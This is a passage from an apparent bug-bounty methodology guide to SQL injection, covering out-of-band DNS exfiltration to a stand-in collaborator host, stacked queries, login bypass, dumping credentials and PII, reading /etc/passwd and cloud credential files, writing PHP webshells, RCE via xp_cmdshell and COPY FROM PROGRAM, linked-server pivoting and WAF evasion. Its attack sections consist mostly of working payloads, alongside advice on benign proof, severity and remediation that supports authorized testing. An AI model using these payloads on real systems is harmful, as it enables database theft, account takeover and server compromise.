When there's **no in-band channel** (no error, no reflected output, no boolean diff) and time-blind is too slow/unstable, force the DB to make a **network request** (DNS or HTTP) to infrastructure you control — the hostname carries the stolen data. Also a fast **confirmation** even when other channels exist.

## 10.1 The OOB primitives per DBMS
```
MSSQL (very reliable):
  '; EXEC master..xp_dirtree '\\'+(SELECT TOP 1 password FROM users)+'.OOB.yourcollab.net\x'-- -
  '; DECLARE @q varchar(1024); SET @q='\\'+(SELECT @@version)+'.OOB.collab\a'; EXEC master..xp_fileexist @q-- -
Oracle (UTL_HTTP / UTL_INADDR / DNS pkg):
  ' AND (SELECT UTL_INADDR.GET_HOST_ADDRESS((SELECT user FROM dual)||'.OOB.collab'))IS NOT NULL-- -
  ' AND (SELECT DBMS_LDAP.INIT(((SELECT user FROM dual)||'.OOB.collab'),80) FROM dual)IS NOT NULL-- -
PostgreSQL (needs privilege / extensions):
  '; COPY (SELECT '') TO PROGRAM 'nslookup $(whoami).OOB.collab'-- -    (also an RCE primitive, §16)
  ' ; SELECT dblink_connect('host=OOB.collab ...')-- -                  (if dblink installed)
MySQL (Windows server, UNC path triggers SMB/DNS):
  ' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT @@version),'.OOB.collab\\a'))-- -   (Windows + secure_file_priv off)
```

## 10.2 Use Burp Collaborator / a DNS logger
```
1. Get a Collaborator (or your DNS) hostname:  abcdef.oastify.com
2. Embed a quick value first (e.g. user/db name) as the subdomain → confirm the DNS hit lands.
3. Then exfil char/field chunks as subdomains; reassemble from the DNS log.
```
> **If this → then that:** nothing reflects, boolean is flat, and time-blind is unreliable → go **OOB**: trigger a DNS/HTTP callback (`xp_dirtree`/`UTL_INADDR`/`COPY…TO PROGRAM`) with a benign value (the DB name) as a subdomain of your Collaborator. **A single DNS hit carrying `database()` is irrefutable proof** and far faster than time-blind. OOB also proves egress, which strengthens the report. (PG `COPY…TO PROGRAM` is simultaneously an **RCE** primitive — see §16.)

---

# 11. Stacked Queries

Some drivers let you terminate the first statement and append a **second, arbitrary** statement with `;` — the gateway to `INSERT`/`UPDATE`/`DROP`/`EXEC`/RCE that a single-`SELECT` injection can't reach.
```
Supported (commonly): PostgreSQL (libpq), MSSQL (most .NET drivers), SQLite (some), Oracle (limited via PL/SQL blocks).
Often NOT supported:   MySQL via mysqli_query / classic PDO single-query mode (PDO with emulation can allow it).
Test:    '; SELECT pg_sleep(5)-- -      '; WAITFOR DELAY '0:0:5'-- -      → a delay confirms the SECOND statement ran.
Use:     '; UPDATE users SET role='admin' WHERE id=<your-own-test-id>-- -   (privesc — ONLY on your own row, §25)
         '; EXEC xp_cmdshell 'whoami'-- -   (MSSQL RCE, §16)
         '; CREATE TABLE … / COPY … FROM PROGRAM …   (PG file/RCE, §16)
```
> **If this → then that:** a `;`-separated second statement (`'; WAITFOR DELAY '0:0:5'--`) visibly executes → **stacked queries are enabled** → you can reach **write/exec** primitives (UPDATE/INSERT, `xp_cmdshell`, `COPY…FROM PROGRAM`). This is a major escalation, but writes are **dangerous on production** — demonstrate with a **read-only** stacked statement (a `SELECT pg_sleep`/`WAITFOR`) or a write **scoped to your own test row**, never a table-wide UPDATE/DROP (§25).

---

# PART III — EXPLOITATION BY IMPACT (where the money is)

> Every PoC uses **benign proof** (`version()`, DB/user name, one row of a benign or your-own table), **no mass dump**, **no destructive writes on production** (§25). The finding is **the query's behavior changed with a concrete impact**, not a reflected quote or a lone 500.

# 12. Authentication Bypass

A login that builds `SELECT * FROM users WHERE user='$u' AND pass='$p'` is bypassable by making the `WHERE` always-true or commenting out the password check.
```
COMMENT OUT the password:   user = admin'-- -          → WHERE user='admin'-- -' AND pass='…'   (password ignored)
                            user = admin'#             (MySQL)        user = admin'/*
ALWAYS-TRUE:                user = ' OR '1'='1'-- -     pass = anything   → first row (often admin/first user)
                            user = ' OR 1=1 LIMIT 1-- -
TARGET a user:              user = admin' AND '1'='1'-- -    → log in as admin specifically
SUBQUERY (when one field):  user = admin' AND substring(pass,1,1)='a   → also a blind oracle on the password
UNION a fake row (advanced): user = nonexistent' UNION SELECT 1,'admin','<known-hash-or-blank>'-- -   → forge a matching row
```
**Why it works:** the app treats "≥1 row returned" (or "row matches") as authenticated. Forcing the `WHERE` true returns a user row without the real password.
> **If this → then that:** `admin'-- -` (or `' OR '1'='1'-- -`) **logs you in** → **authentication bypass**; if you land on **admin/privileged → Critical ATO**, otherwise High. Confirm with a benign signal (you reach the authenticated/admin page on **your own test target** or as the first user) — **don't** rummage through a real user's account to "prove" it (§25). Note which account you land on; `' OR 1=1 LIMIT 1` often lands on the first/admin row.

---

# 13. Data Extraction — Schema → Dump

Once you have a channel (UNION, error, boolean, or time), the workflow is the same: **find the DBs → tables → columns → pull rows**. Use the metadata source for your engine.

## 13.1 Enumerate the schema
```
MySQL/PostgreSQL/MSSQL (information_schema):
  databases:  SELECT schema_name FROM information_schema.schemata
  tables:     SELECT table_name FROM information_schema.tables WHERE table_schema=database()
  columns:    SELECT column_name FROM information_schema.columns WHERE table_name='users'
  current:    database() / current_database() / DB_NAME()      user: current_user / user() / SYSTEM_USER
Oracle:       SELECT table_name FROM all_tables     SELECT column_name FROM all_tab_columns WHERE table_name='USERS'
              (Oracle is UPPER-case by default; current user: SELECT user FROM dual)
SQLite:       SELECT name FROM sqlite_master WHERE type='table'    (then SELECT sql FROM sqlite_master for the schema)
```

## 13.2 Pull the rows (one visible column → concatenate)
```
UNION:   ' UNION SELECT CONCAT(user,0x3a,password),NULL FROM users LIMIT 1-- -            (MySQL)
         ' UNION SELECT string_agg(usename||':'||passwd, ','),NULL FROM pg_shadow-- -      (PG, if privileged)
BLIND:   poc/sqli_blind.py --extract "SELECT password FROM users LIMIT 1"  (binary-search char-by-char)
GROUP/agg to one cell:  GROUP_CONCAT (MySQL) · string_agg (PG) · LISTAGG (Oracle) · group_concat (SQLite)
```

## 13.3 The high-value targets
```
□ Credentials:  users/admin tables → password hashes (then offline cracking), API keys, session tokens, 2FA secrets.
□ PII:          emails, names, addresses, phone, DOB, government IDs, payment data (PCI scope ⇒ severity up).
□ Secrets:      config tables, integration keys, SMTP/cloud creds, JWT signing keys, encryption keys.
□ Pivot data:   internal hostnames, connection strings, linked-server names (feed §17 + SSRF/recon kits).
```
> **If this → then that:** a working channel + schema access → you can dump anything the DB user can read. For the **report, stop at proof**: `version()`, `current_user`, the **count** of rows in `users`, and **one** row from a benign/your-own-account table — that already proves "arbitrary read of the database." **Mass-dumping real users' PII/hashes adds legal risk and no bounty** (§25). If hashes are readable, *note* it (raises severity) without exfiltrating them all.

---

# 14. Reading Files from the Server

If the DB user has file privileges, SQLi becomes **arbitrary file read** — config files, source code, `/etc/passwd`, cloud-credential files, often containing more creds to pivot on.
```
MySQL:       ' UNION SELECT LOAD_FILE('/etc/passwd'),NULL-- -          (needs FILE priv + secure_file_priv unset/permissive)
             (read in chunks if large; Windows: '\\\\share\\file' UNC also triggers SMB)
PostgreSQL:  ' ; CREATE TABLE t(x text); COPY t FROM '/etc/passwd'; SELECT x FROM t-- -   (superuser)
             SELECT pg_read_file('/etc/passwd',0,100000)                                  (≥ some versions / privs)
MSSQL:       ' UNION SELECT BulkColumn,NULL FROM OPENROWSET(BULK '/etc/passwd', SINGLE_CLOB) x-- -   (needs ADMINISTER BULK OPS)
Oracle:      UTL_FILE.GET_LINE on a directory object, or via external tables (needs a DIRECTORY grant)
SQLite:      no native file read (attach/load_extension may be disabled).
HIGH-VALUE TARGETS:
  /etc/passwd  /etc/hosts  app config (wp-config.php / .env / settings.py / web.config / application.properties)
  DB config (my.cnf / pg_hba.conf)  cloud creds (~/.aws/credentials, /var/run/secrets/...)  source code (for more bugs)
```
> **If this → then that:** `LOAD_FILE('/etc/passwd')` (or the per-DBMS equivalent) returns file contents → **arbitrary file read = High**, and frequently a *pivot*: read the app's config/`.env` for DB/cloud creds, then the source for more vulns. Prove with a **benign, non-sensitive** file (`/etc/hostname`, `/etc/passwd` is conventional and low-risk) — don't exfiltrate private keys or customer files to "prove" it (§25).

---

# 15. Writing Files → Webshell

If the DB user can **write** to a web-served directory, SQLi → **webshell → RCE**.
```
MySQL (FILE priv, secure_file_priv permissive, known webroot, stacked or UNION INTO):
  ' UNION SELECT '<?php system($_GET[0]);?>',NULL INTO OUTFILE '/var/www/html/s.php'-- -
  (INTO DUMPFILE for binary/exact bytes; OUTFILE adds row/field terminators)
PostgreSQL (superuser):
  '; COPY (SELECT '<?php system($_GET[0]);?>') TO '/var/www/html/s.php'-- -
MSSQL:        write via OLE automation (sp_OACreate) or xp_cmdshell echo (see §16) — usually you'd just use xp_cmdshell.
PREREQUISITES (all must hold): write privilege + known absolute webroot path + that dir is web-served + file funcs enabled.
```
> **If this → then that:** you can write to a web-served path → drop a **minimal, benign** marker file first (e.g. a `.txt` containing a random token) and fetch it over HTTP to **prove write+serve** — *that alone is the PoC*. Only escalate to an actual shell on an **own-lab / explicitly-authorized** target, and use a **non-weaponized** placeholder. On a bounty, "I wrote a file to the webroot and read it back" already proves RCE-grade impact without dropping a live shell (§25).

---

# 16. Remote Code Execution per DBMS

The top of the impact tree. Privilege-dependent, but when it lands it's an unambiguous **Critical**.
```
MSSQL — xp_cmdshell (the classic):
  '; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
  '; EXEC master..xp_cmdshell 'whoami'-- -                       (output not returned inline → use OOB §10 or a temp table)
  alt: sp_OACreate (OLE automation), CLR assemblies, Agent jobs.
PostgreSQL — COPY … FROM PROGRAM (superuser, PG ≥ 9.3):
  '; CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'id'; SELECT o FROM cmd-- -
  alt: untrusted PL/Python/PL/Perl; the CVE-2019-9193 technique; older: custom C function.
MySQL — UDF (sys_exec/sys_eval, needs FILE + writable plugin_dir):
  write lib_mysqludf_sys.so into the plugin dir (via INTO DUMPFILE), CREATE FUNCTION sys_exec RETURNS int SONAME 'lib…';
  SELECT sys_exec('id');     (high bar; more often you go file-write→webshell §15)
Oracle — DBMS_SCHEDULER / Java stored procedure / PL/SQL (needs privileges):
  run an OS command via a scheduler job or a loaded Java class (CREATE JAVA SOURCE … runtime.exec).
PROOF: run a BENIGN command (whoami / id / hostname) and capture the single line of output (inline, temp table, or OOB).
```
> **If this → then that:** stacked queries + a privileged DB account → try the engine's OS-exec primitive with a **benign** command (`whoami`/`id`/`hostname`). Output often isn't inline — capture it via a **temp table** you then `SELECT`, or **OOB** (encode it into a DNS lookup, §10). A single `whoami` line is **Critical RCE on the DB host** — stop there; do not run further commands, add accounts, or persist (§25). RCE is the headline finding — lead the report with it.

---

# 17. Privilege Escalation & Lateral Movement

SQLi rarely stops at one DB.
```
DB privesc:        read current privileges (is_superuser/sysadmin/DBA_ROLE_PRIVS); abuse over-privileged accounts.
                   MSSQL:  ' ; EXEC sp_addsrvrolemember 'youruser','sysadmin'-- -  (if permitted) → DBA.
                   PG:     ALTER ROLE … SUPERUSER (if permitted).
Linked servers (MSSQL — lateral to OTHER databases/hosts):
  ' ; SELECT * FROM OPENQUERY([LINKEDSRV],'SELECT @@version')-- -      → run queries on a linked server.
  EXECUTE … AT [LINKEDSRV]                                            → including xp_cmdshell on the remote box.
Credential reuse:  dumped DB/app creds → reuse against SSH/RDP/admin panels/cloud (authorized).
Network pivot:     read internal hostnames / connection strings → feed SSRF / recon kits; OOB proves egress.
Hash cracking:     dumped password hashes → offline crack (hashcat) → reuse (authorized red-team only).
```
> **If this → then that:** the DB account is **DBA/superuser** or there are **linked servers** → you can move *beyond* the one database: escalate to DBA, query/execute on linked MSSQL servers (`OPENQUERY`/`EXECUTE … AT`), or reuse dumped creds. In a bounty, **document the capability** (e.g. "the account is `sysadmin`; `OPENQUERY` to `[FINANCE]` returns its version") as proof of lateral reach — don't actually pivot into other systems unless the scope explicitly covers them (§25).

---

# 18. Second-Order SQL Injection

Your input is **stored** safely, then later **concatenated** into a query by a *different* feature (a report job, an admin search, a profile render, an audit query) that trusts stored data and doesn't re-escape it.
```
PLANT:   set a stored field (username, display name, address, filename, comment) to a payload, e.g.
         registration username:  admin'-- -      or      profile bio:  x' UNION SELECT @@version-- -
TRIGGER: invoke the consumer (view your profile in admin, run a report/export, a stats job, a "users like you" feature).
WATCH:   does the consumer error / change rows / sleep?  Time/OOB payloads survive storage well:
         display name = a'||(SELECT pg_sleep(5))||'    → the page that renders all names delays.
```
> **If this → then that:** a parameter that's safely parameterized on input but **stored and later reused** → test **second-order**: plant a benign breaker (and a time/OOB payload, which survives storage) in the stored field, then trigger every feature that reads it. The vulnerable query is in the **consumer**, often running with **higher privilege** (an admin report) than your session — making second-order frequently *higher* impact and *harder to spot*. The classic case: a registration form parameterizes the insert but the password-reset/admin-search query string-builds with the stored username.

---

# 19. WAF / Filter / ORM Evasion

A WAF or naive blacklist blocks `'`, `UNION`, `SELECT`, spaces, or comments — route around it. Apply **one layer at a time** and re-confirm the injection still works.
```
COMMENTS to break keywords:    UN/**/ION  SE/**/LECT   ·  MySQL inline-exec: /*!50000UNION*/ /*!SELECT*/
CASE / mixed:                  uNiOn sElEcT  (most WAF regexes are case-insensitive, but some aren't)
WHITESPACE alternatives:       %09 %0a %0b %0c %0d  ·  /**/  ·  parentheses:  UNION(SELECT(1))  ·  MySQL: tab/newline
ENCODING:                      URL %27=' · double-encode %2527 · MySQL hex 0x61646d696e for 'admin' · CHAR()/CHR()
                               no-quote strings:  0x... (MySQL) · CHR(65)||CHR(66) (Oracle/PG) · CHAR(65)+ (MSSQL)
KEYWORD SPLIT / OBFUSCATE:     concat keywords; nullbytes; comments inside; double keywords  (UNIUNIONON if it strips one)
LOGIC variety:                 AND→&&  OR→||  =→ LIKE / <> / BETWEEN / IN  ·  ' OR 1=1 → ' OR 'a'='a → ' OR 2>1
TIME over BOOLEAN:             if response-diff is normalized by the WAF/cache, a SLEEP delay still leaks (§8).
SECOND-ORDER route-around:     store the payload where the WAF doesn't inspect (a profile field), trigger later (§18).
ORM escape hatches:            the value is parameterized but the SORT COLUMN / RAW fragment isn't → identifier inject (§5.4).
HPP / param pollution:         id=1&id=2 ·  split the payload across duplicated params some stacks re-concatenate.
```
> **If this → then that:** a keyword/char is blocked → defeat it at the **cheapest layer**: `UNION`→`/*!UNION*/` or `UNI/**/ON`, space→`/**/` or `%09`, quote→hex (`0x61646d696e`) or `CHAR()`, `=`→`LIKE`. If response-difference is normalized away, switch to **time** (a delay survives most WAFs). If the front-end is parameterized, hunt the **identifier/sort** slot (§5.4) and **second-order** (§18) — the two places ORMs and WAFs routinely miss.

---

# 20. DBMS-Specific Deep Dives

The compact "what's different per engine" reference (full payloads in `SQL_INJECTION_ARSENAL.md` §per-DBMS, syntax table in Appendix C).

## 20.1 MySQL / MariaDB
```
Detect:   @@version · /*!12345 */ inline runs only on MySQL · ' AND SLEEP(5)
Strings:  CONCAT() (no || by default; PIPES_AS_CONCAT mode changes this) · 0xHEX literals · CHAR(65,66)
Comments: -- -  (needs trailing space/char) · # · /*…*/ · /*!…*/ (version-gated execution)
Stacked:  usually NO via mysqli; PDO emulated-prepares MAY allow.
Blind:    SLEEP(), IF(), SUBSTRING/MID, ASCII, BENCHMARK (heavy CPU alt) · error: extractvalue/updatexml/floor()
Schema:   information_schema.{schemata,tables,columns} · database() user() current_user()
Files:    LOAD_FILE() read · INTO OUTFILE/DUMPFILE write (FILE priv + secure_file_priv) → webshell (§15)
RCE:      UDF lib_mysqludf_sys (high bar) — usually go file-write→webshell instead
```

## 20.2 PostgreSQL
```
Detect:   version() · ' AND (SELECT 1 FROM pg_sleep(0))::text='' · :: cast syntax · string ||
Strings:  a||b · CHR(65) · $$dollar quoting$$ · E'\\x..' escapes
Comments: --  /*…*/   Stacked: YES (libpq) → very powerful
Blind:    pg_sleep() · SUBSTR · ASCII · CASE WHEN · error via CAST text→int
Schema:   information_schema.* · pg_catalog (pg_user, pg_shadow for hashes if superuser) · current_database()
Files:    pg_read_file() · COPY … FROM '/path' (superuser)   write: COPY (…) TO '/path'
RCE:      COPY … FROM PROGRAM 'cmd' (superuser, ≥9.3; CVE-2019-9193) · untrusted PL/Python/PL/Perl · dblink for OOB
```

## 20.3 Microsoft SQL Server (MSSQL)
```
Detect:   @@version · WAITFOR DELAY '0:0:5' · string + concat · "Unclosed quotation mark" / "Conversion failed" errors
Strings:  a+b · CHAR(65) · N'unicode' · CAST/CONVERT (also error-based extraction)
Comments: --  /*…*/   Stacked: YES (most drivers) → enables EXEC
Blind:    WAITFOR DELAY · SUBSTRING · ASCII/UNICODE · IF · error: CONVERT(int,(subquery))
Schema:   information_schema.* · sys.databases/sys.tables/sys.columns · DB_NAME() SYSTEM_USER
Files:    OPENROWSET(BULK …) read · OLE automation write   OOB: xp_dirtree/xp_fileexist (DNS/SMB) (§10)
RCE:      xp_cmdshell (sp_configure to enable) · sp_OACreate (OLE) · CLR · Agent jobs · linked servers OPENQUERY (§17)
```

## 20.4 Oracle
```
Detect:   banner FROM v$version · SELECT … FROM dual required · ORA-#### errors · DBMS_PIPE.RECEIVE_MESSAGE for time
Strings:  a||b · CHR(65) · q'[quote]' alt-quoting
Comments: --  /*…*/   Stacked: limited (PL/SQL blocks)
Blind:    DBMS_PIPE.RECEIVE_MESSAGE(('x'),5) time · DBMS_LOCK.SLEEP (if granted) · SUBSTR · ASCII · CASE
          error/OOB: UTL_INADDR.GET_HOST_NAME / UTL_HTTP / DBMS_LDAP / CTXSYS.DRITHSX.SN
Schema:   all_tables/user_tables · all_tab_columns · SELECT user FROM dual · UPPER-case identifiers by default
Files:    UTL_FILE (directory object) · external tables
RCE:      DBMS_SCHEDULER · Java stored procedure (runtime.exec) · PL/SQL (privilege-dependent)
```

## 20.5 SQLite
```
Detect:   sqlite_version() · "unrecognized token" / "SQL logic error" · no native SLEEP
Strings:  a||b · CHAR(65) · X'68' hex blobs
Comments: --  /*…*/   Stacked: sometimes (driver-dependent)
Blind:    boolean (no reliable time) · SUBSTR · UNICODE · CASE WHEN · randomblob(N) for crude timing (unreliable)
Schema:   sqlite_master (type,name,tbl_name,sql) → table & column names from the stored CREATE statements
Files:    none native (ATTACH DATABASE / load_extension usually disabled); RCE: none native.
Note:     common in mobile apps & small web apps; lower server-impact ceiling (no RCE/file by default) but full DB read.
```
> **If this → then that:** once §6 names the engine, jump to that engine's block here + the arsenal's per-DBMS section. The **biggest ceiling-changers**: MSSQL (`xp_cmdshell` RCE, linked-server lateral) and PostgreSQL (`COPY…FROM PROGRAM` RCE) — if you've confirmed one of those + stacked queries + privilege, you're hunting **Critical RCE**, not just a dump.

---

# PART IV — VALIDITY, SEVERITY & REPORTING

# 21. The Validity-First Mindset

## 21.1 The four questions a triager asks (answer them in your report)
1. **Did the query actually change?** Show a controlled difference: `id=1 AND 1=1` (row shows) vs `id=1 AND 1=2` (row gone); or `' UNION SELECT @@version,NULL-- -` returns the version; or `AND SLEEP(5)` delays while `SLEEP(0)` doesn't.
2. **What concrete impact?** RCE / auth bypass / arbitrary DB read (dump) / file read-write / privesc. Name it.
3. **What does the attacker need?** Usually just an unauthenticated request to one parameter → low bar.
4. **Reproducible & in scope?** Exact endpoint/param, the payload, the before/after (rows / version string / timing / DNS hit), the DBMS.

## 21.2 The "reflected error vs altered query" rule (most important)
| You have | Verdict | Why / next |
|---|---|---|
| A `'` produces a 500 / SQL error in the page | Lead only | A crash isn't exploitation — prove the *query* changed (§5–§9). |
| `AND 1=1` vs `AND 1=2` give different responses | **Boolean SQLi** | The query branches on your input (§7). |
| `AND SLEEP(5)` delays, `SLEEP(0)` doesn't (repeatably) | **Time SQLi** | You control execution (§8). |
| `UNION SELECT @@version` shows the version | **UNION SQLi → read** | Arbitrary read confirmed (§9/§13). |
| `extractvalue(…version…)` leaks version in the error | **Error-based SQLi** | Data exfil via error (§6). |
| OOB DNS hit carrying `database()` | **OOB SQLi** | Out-of-band confirmed (§10). |
| `admin'-- -` logs you in | **Auth bypass → ATO** | The high-value outcome (§12). |
| `xp_cmdshell 'whoami'` / `COPY…FROM PROGRAM 'id'` returns output | **RCE** | Top severity (§16). |

## 21.3 Production-scope discipline
Prove on **production** with **benign reads** (`version()`, one benign row) and **non-destructive** payloads. Re-test time/boolean oracles a few times to exclude caching/jitter. **Never** run table-wide `UPDATE`/`DELETE`/`DROP`, never mass-dump real PII, never drop a live shell on a bounty target. Re-test partial fixes (escaping `'` but not numeric context, blocking `UNION` but not boolean/time) — each is a fresh valid finding.

---

# 22. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **A `'` causes a 500 / stack trace** | A crash/error ≠ a controllable query. | You then alter logic (boolean/union/time) — error is a *lead* (§5–§9). |
| 2 | **A SQL error string reflected in the page** | Verbose errors are an info leak, not injection. | You force data *into* the error (error-based) or otherwise change the query (§6). |
| 3 | **A response-length blip on one request** | Could be caching/jitter/ads. | A **stable, repeatable** boolean/time oracle across retries (§7/§8). |
| 4 | **`sqlmap` flagged it, no hand proof** | Triagers reject tool-only claims; FPs happen. | You reproduce by hand: version via UNION/error, or a clean true/false/time oracle (§27). |
| 5 | **A slow endpoint you call "time-based"** | Slow ≠ controlled delay. | `SLEEP(5)` delays and `SLEEP(0)` doesn't, **repeatably**, tied to your payload (§8). |
| 6 | **Client-side / ORM that's actually parameterized** | Reflected input ≠ SQL sink. | A real query-behavior change (rows/version/timing/DNS) (§21). |
| 7 | **NoSQL/`$ne` behavior called "SQLi"** | Different class. | Report as NoSQL injection (its own kit) (§2.6). |
| 8 | **Self-DoS via a huge/heavy query** | Harmful, not a PoC. | N/A — use bounded, benign payloads. |
| 9 | **Destructive proof (DROP/DELETE ran)** | Damaging real data is never an acceptable PoC. | Never — prove read-only / own-row only (§25). |

> Rule of thumb: if you can't show the **database did something different because of your input** — returned other rows, branched true/false repeatably, slept on command, leaked a value via error/UNION/DNS, or executed a command — you have **a reflected error or a crash, not SQL injection.** Prove the altered query before reporting.

---

# 23. Severity Calibration — how triagers really rate SQLi

| Scenario | Typical | What moves it |
|---|---|---|
| **RCE on the DB host (xp_cmdshell / COPY…FROM PROGRAM / UDF)** | **Critical** | Full server compromise; the default top outcome. |
| **Auth bypass → log in as admin (ATO)** | **Critical** | Administrative takeover via one request. |
| **Arbitrary DB read incl. password hashes / payment / PII at scale** | **High–Critical** | Mass credential/PII/PCI exposure. |
| **Arbitrary DB read of non-credential data** | **High** | Confirmed dump capability; scales with sensitivity. |
| **Arbitrary file read (config/source/`/etc/passwd`)** | **High** | Often pivots to more creds/RCE. |
| **File write to webroot (→ shell)** | **Critical** | RCE-grade once served. |
| **Blind read (boolean/time), non-credential data** | **High** | Confirmed read; rate-limited but real. |
| **Stacked-query write capability (own-row demonstrated)** | **High–Critical** | Integrity impact; capability-dependent. |
| **DB privesc to DBA / linked-server lateral** | **High–Critical** | Beyond one DB. |
| **Error string reflected / `'` 500, no query change** | **Low (info) / — ** | Verbose-error info leak at best; prove a query change. |

**CVSS / CWE:**
- RCE: `AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H` → ~10.0 (Critical). **CWE-89**.
- Auth bypass → admin: `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N` → ~9.1 (Critical). CWE-89 (+ **CWE-287**).
- DB read (dump): `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → ~7.5 (High); raise `I` if writable, raise scope if it crosses systems.
- Anchor to **CWE-89** (Improper Neutralization of Special Elements used in an SQL Command); parent **CWE-74** (Injection); add **CWE-287** (auth bypass), **CWE-285** (authorization), **CWE-78** (when it reaches OS-command/RCE).

---

# 24. Impact-Escalation Playbooks — "you found X, now do Y"

### 24.1 You found: *a `'` throws a SQL error*
- **Escalate:** fingerprint the DBMS from the error (§6), confirm the **context** (string/numeric, §5), then build error-based extraction or pivot to boolean/UNION/time.
- **Evidence:** the error text + a subsequent controlled query change (version via error/UNION).
- **Severity:** Low alone → High/Critical once you read data / bypass auth / RCE.

### 24.2 You found: *`AND 1=1` vs `AND 1=2` differ (boolean)*
- **Escalate:** confirm DBMS (concat/comment behavior), extract `version()`/DB name with `sqli_blind.py`, then schema → a benign row (§7/§13).
- **Evidence:** the stable true/false pages + a short benign extraction.
- **Severity:** High (arbitrary read).

### 24.3 You found: *`SLEEP(5)`/`pg_sleep`/`WAITFOR` delays the response*
- **Escalate:** the delay also fingerprints the DBMS; extract a benign value via conditional sleep; if too slow, find a boolean/UNION channel or go OOB (§8/§10).
- **Evidence:** repeatable delay tied to the payload (5s vs 0s).
- **Severity:** High.

### 24.4 You found: *the result set is reflected (UNION works)*
- **Escalate:** column count → visible column → `version()` → schema → one benign row; check `users` for readable hashes (note, don't dump) (§9/§13).
- **Evidence:** `UNION SELECT @@version` on the page + a row count.
- **Severity:** High (Critical if hashes/PII at scale).

### 24.5 You found: *a login that errors on `'`*
- **Escalate:** auth-bypass payloads (`admin'-- -`, `' OR 1=1 LIMIT 1-- -`); confirm which account you land on (§12).
- **Evidence:** authenticated session without valid creds (your test target).
- **Severity:** **Critical** (admin) / High (normal user).

### 24.6 You found: *stacked queries run (`'; WAITFOR DELAY` works) on MSSQL/PG*
- **Escalate:** check privilege; try `xp_cmdshell`/`COPY…FROM PROGRAM` with a **benign** command, capture output via temp table/OOB; check linked servers (§16/§17).
- **Evidence:** `whoami`/`id` output line.
- **Severity:** **Critical** (RCE).

### 24.7 You found: *FILE privilege (LOAD_FILE / COPY works)*
- **Escalate:** read a benign file to prove read; if a writable webroot exists, write a benign marker and fetch it to prove write→serve (§14/§15).
- **Evidence:** file contents of a benign file / the marker fetched over HTTP.
- **Severity:** High (read) → Critical (write→shell).

### 24.8 You found: *a stored field reused in a later query (second-order)*
- **Escalate:** plant a time/OOB payload, trigger the consumer (admin search/report), confirm the delay/callback fires from the consumer's context (§18).
- **Evidence:** the consumer endpoint delaying/calling back from your stored payload.
- **Severity:** High–Critical (often runs with elevated privilege).

---

# 25. Building a Professional, Safe PoC

```
DO:
  □ Prove the QUERY changed, not a reflected error: id=1 AND 1=1 (row) vs id=1 AND 1=2 (no row);
    OR UNION SELECT @@version (version shows); OR AND SLEEP(5) delays vs SLEEP(0); OR an OOB DNS hit; OR admin'-- - logs in.
  □ Use BENIGN proof values: version(), current_user, current DB name, COUNT(*) of a table, ONE row of a
    benign / YOUR-OWN-account table. That already proves "arbitrary read."
  □ For auth bypass, land on a test/admin account YOU control (or the first row) — confirm the authenticated page only.
  □ For file read, read a NON-sensitive file (/etc/hostname, /etc/passwd by convention) — not keys/customer data.
  □ For file write / RCE, drop a BENIGN marker (random token in a .txt) and fetch it / run ONE benign command (whoami) —
    capture a single line, then STOP.
  □ Capture: exact endpoint/param, the payload, before/after (rows / version / timing / DNS hit), the DBMS, the channel.
  □ Pace blind/time extraction (jitter, low concurrency) — it's request-heavy and loud (§27).
DON'T:
  □ Mass-dump real users' PII / password hashes (legal risk; adds no bounty). Count + one benign row is enough.
  □ Run table-wide UPDATE/DELETE/DROP or any destructive write. Scope writes to YOUR OWN test row only.
  □ Drop a live, weaponized webshell or run post-exploitation commands on a bounty target.
  □ Pivot into other systems/linked servers beyond scope (document the capability instead).
  □ Report a reflected SQL error or a lone 500 as "SQL injection."
  □ Let sqlmap run --risk 3 (stacked writes) / mass --dump on production.
```
> The single most important restraint: **prove the database did your bidding — once, benignly — and stop.** A `version()` string (or `whoami` line) proves the same root cause as dumping a million rows, with none of the risk. Same discipline as the IDOR/LDAP/CommandInjection guides.

**Remediation to include:** use **parameterized queries / prepared statements** everywhere (bind variables — `?`/`$1`/`:name`), never string-concatenate input into SQL. For **identifiers** (sort column/table) that can't be parameterized, **allowlist** against a fixed set of known column names. Use **least-privilege DB accounts** (no FILE/superuser/`xp_cmdshell`; separate read vs write users) so even a successful injection can't read files or run commands. Add an **ORM/query-builder** with safe defaults, **disable verbose DB errors** in production, and put a **WAF** as defense-in-depth (not the primary control). For login, **never** trust "row returned" — hash-compare server-side with a constant-time function.

---

# 26. Reporting, CWE/CVSS & De-duplication

Use `SQL_INJECTION_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "SQL injection in <param> on <endpoint> → <RCE | auth bypass | DB read/dump>" (name the IMPACT)
2. Severity     CVSS 3.1 vector + score + CWE-89 (+ CWE-287 / CWE-78 for auth-bypass / RCE outcomes)
3. Asset        exact endpoint/param/header + DBMS + context (string/numeric/identifier) + technique (error/union/boolean/time/oob/stacked)
4. Summary      where input reaches SQL, how you injected, what the query did differently
5. Steps        numbered: the payload, the before/after evidence (rows / version / timing / DNS hit / shell output)
6. PoC          version()+one benign row / the authenticated session / the SLEEP delay / the whoami line — BENIGN, bounded
7. Impact       RCE / ATO / mass read — the "so what"
8. Remediation  parameterized queries + identifier allowlist + least-privilege DB user + disable verbose errors (§25)
```
**De-dup:** one query/sink = one finding even if reachable via several params or techniques; lead with the **highest** impact (RCE over dump over boolean on the same sink). Don't split "boolean works" and "UNION works" if they hit the same query. **Distinct sinks** (login vs search vs `?sort=`) = distinct reports. If the same code path is reached via many parameters, report once and list the parameters.

---

# 27. Automation (sqlmap) & Red-Team Notes

**sqlmap — the right way (find candidates / grind after hand-confirmation):**
```bash
# confirm + fingerprint (start gentle; raise level/risk only as needed)
sqlmap -u "https://target/item?id=1" --batch --level=2 --risk=1 --technique=BEUST --dbms=mysql

# from a saved Burp request (carries cookies/headers/body — the reliable way):
sqlmap -r req.txt -p id --batch

# enumerate WITHOUT mass-dumping (PoC-safe):
sqlmap -r req.txt --current-user --current-db --is-dba --banner
sqlmap -r req.txt --tables -D <db>          # then --columns for ONE table; avoid blanket --dump on prod

